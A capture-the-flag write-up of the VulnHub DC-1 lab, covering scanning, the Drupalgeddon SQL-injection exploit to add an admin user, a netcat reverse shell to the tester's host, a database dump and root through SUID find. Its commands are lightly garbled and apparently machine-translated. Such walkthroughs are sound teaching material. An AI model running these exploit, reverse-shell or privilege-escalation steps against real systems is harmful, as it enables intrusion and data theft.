---
title: DC-1 - WRITE-UP
date: 2020-06-06 08:46:00 +0100
categories: [VulnHub, DC]
tags: [beginner, robots, reverse-shell, suid, drupal, cms, rpc, mysql]
lang: en
---

## MAIN INFORMATION
### BOX NAME: DC: 1
### DESCRIPTION

```
DC-1 is a purposely built vulnerable lab to gain experience in the world of penetration testing.

It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.

To complete this challenge, you will require Linux skills, familiarity with the Linux command line, and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.

There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.

There are five flags in total, but the ultimate goal is to find and read the flag in the root's home directory. You don't even need to be root to do this, however, you will require root privileges.

Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.

Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.
```
## NMAP
```bash
$ nmap -A -T4 -p- 192.168.56.112
Starting Nmap 7.80 (https://nmap.org) at 2020-06-06 05:01 EDT
Nmap scan report for 192.168.56.112
Host is up (0.00017s latency).
Not shown: 65531 closed ports
PORT STATE SERVICE VERSION
22 / tcp open ssh OpenSSH 6.0p1 Debian 4 + deb7u7 (protocol 2.0)
| ssh-hostkey:
| 1024 c4: d6: 59: e6: 77: 4c: 22: 7a: 96: 16: 60: 67: 8b: 42: 48: 8f (DSA)
| 2048 11: 82: fe: 53: 4e: dc: 5b: 32: 7f: 44: 64: 82: 75: 7d: d0: a0 (RSA)
| _ 256 3d: aa: 98: 5c: 87: af: ea: 84: b8: 23: 68: 8d: b9: 05: 5f: d8 (ECDSA)
80 / tcp open http Apache httpd 2.2.22 ((Debian))
| _http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| / includes / / misc / / modules / / profiles / / scripts /
| / themes / /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
| _ / LICENSE.txt /MAINTAINERS.txt
| _http-server-header: Apache / 2.2.22 (Debian)
| _http-title: Welcome to Drupal Site | Drupal Site
111 / tcp open rpcbind 2-4 (RPC # 100000)
| rpcinfo:
| program version port / proto service
| 100,000 2.3.4 111 / tcp rpcbind
| 100,000 2,3,4 111 / udp rpcbind
| 100,000 3.4 111 / tcp6 rpcbind
| 100,000 3.4 111 / udp6 rpcbind
| 100024 1 34319 / udp status
| 100024 1 37172 / udp6 status
| 100024 1 48908 / tcp status
| _ 100024 1 53213 / tcp6 status
48908 / tcp open status 1 (RPC # 100024)
Service Info: OS: Linux; CPE: cpe: / o: linux: linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 19.64 seconds
```

We see open port ssh, HTTP, and rpcbind. We come across an unusual protocol here - RPC.
Briefly, this protocol processes requests for a given computer service, where that service is located on another computer on the same network. This protocol, however, does not use information about the network to be able to process such a request and give e.g. program access to it.
We will see in the further course of events whether we will need this protocol :)

When we send a request using RFC, we request the function on another computer. So ***service = function***

But now that's it for RFC, let's look at the open HTTP port, we may find something else there.

## HTTP PAGE
We see the main page with the login form:
![DC site](https://i.imgur.com/4DBbh44.png)

I tried a simple SQL Injection ```'OR 1 = 1 #' 'but it did not succeed. Creating a test account is also not possible, because the account must first be approved by the administrator.
NMAP gave us many directories for the site. So let's see if any of them have anything interesting.

### ROBOTS.TXT
The robots.txt directory turns out to have very useful information.

![Imgur](https://i.imgur.com/EkHWR5q.png)
We can see a blacklist of directories that are blocked for Google bots. If there is a directive like here in robots.txt, we won't really be able to find this directory in google. It can also be assumed that since the web-developer has not forgotten to exclude these directories, he has also not forgotten to block these directories for an ordinary user.
But let's not lose hope and fire up the gobuster.
## GOBUSTER
```$ gobuster dir --url http://192.168.56.112 --wordlist /usr/share/wordlists/dirb/big.txt -s "200" ```
> -s "200" here means only showing the results of those directories that returned HTTP status 200 (ie full directory access)

```bash
================================================== =============
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
================================================== =============
[+] Url: http: //192.168.56.112
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/big.txt
[+] Status codes: 200
[+] User Agent: gobuster / 3.0.1
[+] Timeout: 10s
================================================== =============
2020/06/06 06:07:29 Starting gobuster
================================================== =============
/ 0 (Status: 200)
/ LICENSE (Status: 200)
/ README (Status: 200)
/ node (Status: 200)
/robots.txt (Status: 200)
/ robots (Status: 200)
/ user (Status: 200)
================================================== =============
2020/06/06 06:40:59 Finished
================================================== =============
```
Sorry, but we don't have any useful discovered directories.

## EXPLOIT - CREATING A NEW USER WITH SQL INJECTION

Using the "Wappalyzer" Chrome plugin, I was able to find out which version of Drupal the website is running on. This is version 7.

So let's check if there are any exploits in our local database.
```bash
$ searchsploit drupal 7

-------------------------------------------------- --------------------- ----------------------------- ----
 Exploit Title | Path
-------------------------------------------------- --------------------- ----------------------------- ----
Drupal 7.0 <7.31 - 'Drupalgeddon' SQL Injection (Add Admin User) | php / webapps / 34992.py
Drupal 7.0 <7.31 - 'Drupalgeddon' SQL Injection (Admin Session) | php / webapps / 44355.php
Drupal 7.0 <7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password | php / webapps / 34984.py
Drupal 7.0 <7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password | php / webapps / 34993.php
Drupal 7.0 <7.31 - 'Drupalgeddon' SQL Injection (Remote Code Executio | php / webapps / 35150.php
Drupal 7.12 - Multiple Vulnerabilities | php / webapps / 18564.txt
Drupal 7.x Module Services - Remote Code Execution | php / webapps / 41564.php
Drupal <4.7.6 - Post Comments Remote Command Execution | php / webapps / 3313.pl
Drupal <5.1 - Post Comments Remote Command Execution | php / webapps / 3312.pl
Drupal <7.34 - Denial of Service | php / dos / 35415.txt
Drupal <7.34 - Denial of Service | php / dos / 35415.txt
Drupal <7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploi | php / webapps / 44557.rb
Drupal <7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution | php / webapps / 44542.txt
Drupal <7.58 / <8.3.9 / <8.4.6 / <8.5.1 - 'Drupalgeddon2' Remote C | php / webapps / 44449.rb
Drupal Module Coder <7.x-1.3 / 7.x-2.6 - Remote Code Execution | php / remote / 40144.php
Drupal Module Embedded Media Field / Media 6.x: Video Flotsam / Media: Au | php / webapps / 35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit) | php / remote / 40130.rb
-------------------------------------------------- --------------------- ----------------------------- ----
Shellcodes: No Results
```
We see many of them. The most convenient seems to be adding an account with administrator rights. By executing the exploit script without any flags, we receive the "service" instruction
```bash
$ python /usr/share/exploitdb/exploits/php/webapps/34992.py

  ______ __ _______ _______ _____
 | _ \. ----. -. -. -----. --- .- | | | _ || _ | _ |
 |. | \ | _ | | | _ | _ | | | ___ | _ | ___ | |. | |
 |. | | __ | | _____ | __ | ___._ | __ | / | ___ (__ `- |. |
 |: 1 / | __ | | | |: 1 | |: |
 | :: ... / | | | :: ... | | ::. |
 `------ '` ---' `------- '` ---'
  _______ __ ___ __ __ __
 | _ .----- | | | .----- | __. ----- .---- | | _ | __. ----- .-----.
 | 1 ___ | _ | | |. | | | -__ | __ | _ | | _ | |
 | ____ | __ | __ | |. | __ | __ | | _____ | ____ | ____ | __ | _____ | __ | __ |
 |: 1 | | __ | |: | | ___ |
 | :: ... | | ::. |
 `------- '---'

                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

Discovered by:

Stefan Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww



Usage: 34992.py -t http [s]: // TARGET_URL -u USER -p PASS


Options:
  -h, --help show this help message and exit
  -t TARGET, --target = TARGET
                        Insert URL: http [s]: //www.victim.com
  -u USERNAME, --username = USERNAME
                        Insert username
  -p PWD, --pwd = PWD Insert password
```
Let's complete the command:


```bash
$ python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.56.112 -u Testing -p of the test test

  ______ __ _______ _______ _____
 | _ \. ----. -. -. -----. --- .- | | | _ || _ | _ |
 |. | \ | _ | | | _ | _ | | | ___ | _ | ___ | |. | |
 |. | | __ | | _____ | __ | ___._ | __ | / | ___ (__ `- |. |
 |: 1 / | __ | | | |: 1 | |: |
 | :: ... / | | | :: ... | | ::. |
 `------ '` ---' `------- '` ---'
  _______ __ ___ __ __ __
 | _ .----- | | | .----- | __. ----- .---- | | _ | __. ----- .-----.
 | 1 ___ | _ | | |. | | | -__ | __ | _ | | _ | |
 | ____ | __ | __ | |. | __ | __ | | _____ | ____ | ____ | __ | _____ | __ | __ |
 |: 1 | | __ | |: | | ___ |
 | :: ... | | ::. |
 `------- '---'

                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

Discovered by:

Stefan Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww


[!] VULNERABLE!

[!] Administrator user created!

[*] Login: Testowka
[*] Pass: test test
[*] Url: http://192.168.56.112/?q=node&destination=node
```

Being logged in, we can immediately see that we have administrative rights.

![Panel] (https://i.imgur.com/2fcdluW.png)

While browsing the panel for additional information, we come across an interesting hint (?) Regarding the flag.

![Flag3] (https://i.imgur.com/R5FhG1d.png)

The note refers to the files / etc / passwd and / etc / shadow. The --exec flag most likely means access to a Linux shell. It doesn't necessarily have to be using python.
## GAINING SHELL
Is there any way to get to the shell via the website with administrative rights? Google is here to help.

![Shell-Access-Google] (https://i.imgur.com/uFnnXLH.png)

Apparently, there is a Drupal module that will give us this option. I install it and turn it on. After these steps, I have a shell on the home page.

![Shell] (https://i.imgur.com/sAUmOpy.png)

You will immediately notice the file 'flag.1.txt'. Browsing through its content, we see another hint: ```


```Every good CMS needs a config file - and so do you

So we google "Drupal config file directory".
We can see that it is located in the folder ```/sites/default / ''
In it we have the configuration file ```settings.php```. Already at the very beginning of the file, we see flag 2.

![Imgur](https://i.imgur.com/xlBZq3Q.png)

As the note says, at the bottom, there are credentials for the database account. So let's log in.

```mysql -u dbuser -p ```


This command does not work. We get an access denied error, but it may be more because we are working in a web shell all the time.

## REVERSE SHELL
Let's connect to our machine with the reverse shell ''
nc -nv 192.168.56.103 1234 -e / bin / bash```. It will not be an aesthetic shell so let's make it even better with ```python -c "import pty; pty.spawn ('/ bin / bash')" ```
I repeat the previous steps and enter the password.

## ESCFILTRATION FROM THE DATABASE
We can now extract data from mysql. A good first step would be to show the names of the ```show databases; '' databases
> Remember about the semicolon

We see information_schema which has basic information about the database and its structure. However, we are interested in the drupaldb base.
```use drupaldb '' ```
```show tables from drupaldb; ```
We see one specifically important for us "users" array.
```select * from users; ```
![users](https://i.imgur.com/yx1avkT.png)

So we now have an admin hash. Now the only question is whether we should waste time hashing it? From the previous hints, it can be concluded that the author gives us more options than just breaking the admin password.
## ESCALATION OF POWERS
One of the basic techniques for escalating privileges is through SUID programs (Those that need different privileges than those of the user executing the command)
. To display them, execute the command:
```bash
find / -perm -u = s -type f 2> / dev / null```
```
![Imgur](https://i.imgur.com/lwXRepw.png)

Many of them are normal commands. For example, / usr / bin / passwd must have administrator privileges because it needs access to / etc / passwd and / etc / shadow. However, there is a command ```find```which has unnecessary SUID status
The find command has a built-in flag -exec (Recall the content of the flag3)

[-exec] (https://i.imgur.com/Wxw6Xz6.png)

What we can do now is to execute the command ```'' find / etc / shadow -exec bash \; ```. In doing so, however, we are still the www-data user. This is quite strange. Let's try to do it with a different shell.
To see what else we have to choose from, run ```cat / etc / shells```
```
/ bin / sh
/ bin / dash
/ bin / bash
/ bin / rbash
```
Let's try with dash ``````find / etc / shadow -exec dash \; ```
```bash
$ whoami
root
```
Apparently, it works :)
Going to the ```/ root```directory, we see the file ```thefinalflag.txt```I will keep its contents to myself for now. I encourage you to solve the Box yourself after this write-up and find out what was in the final flag: P
I sincerely hope you learned a lot from this trip on this Box
